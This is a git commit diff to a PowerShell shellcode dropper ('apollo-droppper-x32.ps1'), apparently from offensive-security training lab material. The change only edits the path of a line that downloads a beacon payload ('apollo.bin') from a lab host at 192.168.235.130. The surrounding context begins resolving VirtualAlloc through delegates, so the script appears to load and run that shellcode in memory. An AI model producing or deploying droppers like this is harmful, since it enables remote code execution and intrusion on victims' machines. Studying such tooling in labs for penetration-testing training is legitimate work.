34e933c9debe0f14477bb45cd3bf776fd1a5827c
Víctor Nieves <vnievess@gmail.com>
2026-01-22 21:48:21 +0100

    fixed http path

--- droppers/apollo-droppper-x32.ps1
+++ droppers/apollo-droppper-x32.ps1
@@ -39,7 +39,7 @@ function getDelegateType {
 }
 
 # Download shellcode
-$Shellcode = (New-Object System.Net.WebClient).DownloadData("http://192.168.235.130:8000/osep-material/beacons/apollo.bin")
+$Shellcode = (New-Object System.Net.WebClient).DownloadData("http://192.168.235.130:8000/beacons/apollo.bin")
 
 # VirtualAlloc
 $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
